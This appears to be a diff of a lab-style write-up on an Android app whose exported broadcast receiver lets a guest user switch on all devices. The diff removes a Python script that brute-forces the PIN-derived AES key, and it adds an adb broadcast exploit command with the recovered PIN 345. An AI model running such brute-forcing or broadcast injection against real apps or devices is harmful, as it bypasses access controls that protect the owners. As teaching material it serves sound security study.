@@ -11,6 +11,8 @@ During this review, I discovered the following configuration:
 
 Vulnerability
 The MasterReceiver component is configured with:
+
+```bash
 android:exported="true"
 
 However, it does not define any android:permission attribute.
@@ -27,6 +29,8 @@ Next, I examined the logic inside MasterSwitchActivity.java to understand how th
 From the code, I observed that the application checks whether the user is a Guest. Guest users are restricted from controlling the master switch through the user interface.
 However, this validation only exists in the UI layer. If a broadcast is sent directly to the receiver, the UI restrictions can be bypassed.
 The application expects a broadcast with:
+
+```bash
 Action: MASTER_ON
 Extra: key (PIN)
 
@@ -44,6 +48,8 @@ Searching the code for MASTER_ON revealed that the application uses a checker fu
 <img width="1470" height="956" alt="Screenshot 2026-02-28 at 7 29 58 in the evening" src="https://github.com/user-attachments/assets/e5b23d06-b073-4e13-8690-b27e6bf3e622" />
 
 Inside the code, I discovered an encrypted string:
+
+```bash
 OSnaALIWUkpOziVAMycaZQ==
 
 The application uses AES encryption to validate the PIN.
@@ -52,11 +58,13 @@ The PIN is converted to a string.
 The string is padded to 16 bytes.
 The resulting value is used as the AES key.
 The encrypted value is decrypted and compared to:
+```bash
 master_on
 Weakness
 
 Although AES is a strong encryption algorithm, the key space is extremely small because the key is derived from a numeric PIN.
 The PIN range appears to be:
+```bash
 000 – 999
 This makes the encryption vulnerable to brute force attacks
 
@@ -64,84 +72,18 @@ Step 4: Brute Force the PIN
 
 To recover the correct PIN, I wrote a Python script to brute force the AES key by testing all possible PIN values.
 
-Here is my python script:
-
-import base64
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
-
-
-ENCRYPTED_DS  = "OSnaALIWUkpOziVAMycaZQ=="   
-TARGET        = "master_on"                   
-ALGORITHM     = "AES"                         
-MAX_RANGE     = 1000                     
-
-
-
-def generate_key(static_key: int) -> bytes:
-  
-    key_bytes      = bytearray(16)
-    static_key_b   = str(static_key).encode("utf-8")
-    length         = min(len(static_key_b), 16)
-    key_bytes[:length] = static_key_b[:length]
-    return bytes(key_bytes)
-
-
-def try_decrypt(encrypted: bytes, key_int: int) -> str | None:
-   
-    try:
-        key     = generate_key(key_int)
-        cipher  = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
-        dec     = cipher.decryptor()
-        raw     = dec.update(encrypted) + dec.finalize()
-
-        # Remove PKCS5 padding
-        pad_len = raw[-1]
-        if pad_len < 1 or pad_len > 16:
-            return None
-        return raw[:-pad_len].decode("utf-8")
-    except Exception:
-        return None
-
-
-def crack(encrypted_b64: str, target: str, max_range: int) -> int | None:
-    encrypted = base64.b64decode(encrypted_b64)
-
-    print(f"[*] Encrypted string : {encrypted_b64}")
-    print(f"[*] Target plaintext : {target}")
-    print(f"[*] Brute forcing    : 0 → {max_range:,}")
-    print(f"[*] Algorithm        : AES/ECB/PKCS5Padding\n")
-
-    for i in range(max_range + 1):
-        if i % 100_000 == 0 and i > 0:
-            print(f"    ... tried {i:,} keys so far")
-
-        result = try_decrypt(encrypted, i)
-        if result == target:
-            return i
-
-    return None
-
-
-def main():
-    found = crack(ENCRYPTED_DS, TARGET, MAX_RANGE)
-
-    print()
-    if found is not None:
-        print(f"[+] PIN FOUND: {found}")
-    else:
-        print(f"[-] PIN not found in range 0–{MAX_RANGE:,}")
-
-
-if __name__ == "__main__":
-    main()
-
+My script save to solve.py, you can check it out.
 
 And found the PIN:
 
 <img width="578" height="382" alt="Screenshot 2026-02-28 at 7 43 38 in the evening" src="https://github.com/user-attachments/assets/9296b268-0358-41d9-a24e-a62741dd94d5" />
 
-So, send the PIN via adb command but first we need to sign up and log in to the application:
+Step 5: Exploiting the Broadcast Receiver
+
+Before sending the exploit, I first registered an account and logged into the application.
+As expected, a Guest user cannot control the master switch through the UI, and all devices remain turned off.
+However, since the BroadcastReceiver is exported, we can bypass the UI restriction and directly send a broadcast using ADB.
+
 
 <img width="444" height="776" alt="Screenshot 2026-02-28 at 7 45 10 in the evening" src="https://github.com/user-attachments/assets/03a01e4f-62fb-4e6d-9633-3f319c3a9641" />
 
@@ -151,15 +93,23 @@ And you can see it all are turning off like the above that we anaylze Guest cann
 
 but we have a PIN so we control this via adb command:
 
+Exploit Command
+```bash
 adb shell am broadcast -a MASTER_ON --ei key 345
+This sends the MASTER_ON broadcast along with the correct PIN.
 
 <img width="581" height="384" alt="Screenshot 2026-02-28 at 7 48 18 in the evening" src="https://github.com/user-attachments/assets/7fe48551-5c11-433c-88bd-dfcfc75f7005" />
 
-And we can see, Now all devices are turning on
+Step 6: Result
+
+After sending the broadcast, the application processes the request and enables the master switch.
+All devices are successfully turned ON, demonstrating that the access control mechanism can be bypassed.
+This confirms that the application is vulnerable to unauthorized broadcast injection.
 
 <img width="442" height="795" alt="Screenshot 2026-02-28 at 7 49 27 in the evening" src="https://github.com/user-attachments/assets/539862cb-1f7a-4829-8762-2b72e947595a" />
 
 <img width="452" height="781" alt="Screenshot 2026-02-28 at 7 50 12 in the evening" src="https://github.com/user-attachments/assets/b782e34e-8873-4bac-a7ef-6e4ed994d505" />
+
 
 
 
